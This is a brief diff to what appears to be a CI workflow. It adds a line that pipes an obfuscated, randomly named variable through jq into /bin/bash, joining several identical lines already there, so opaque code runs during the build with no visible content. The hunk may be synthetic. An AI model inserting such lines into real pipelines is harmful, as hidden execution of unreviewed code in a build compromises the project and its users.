@@ -21,6 +21,7 @@ jobs:
           echo $qyi8267 | jq -r .t431 | /bin/bash
           echo $yl8318 | jq -r .kczv37 | /bin/bash
           echo $ds20 | jq -r .sp39183 | /bin/bash
+          printf '%s' "$ejbwk570" | jq -r .lsq72 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
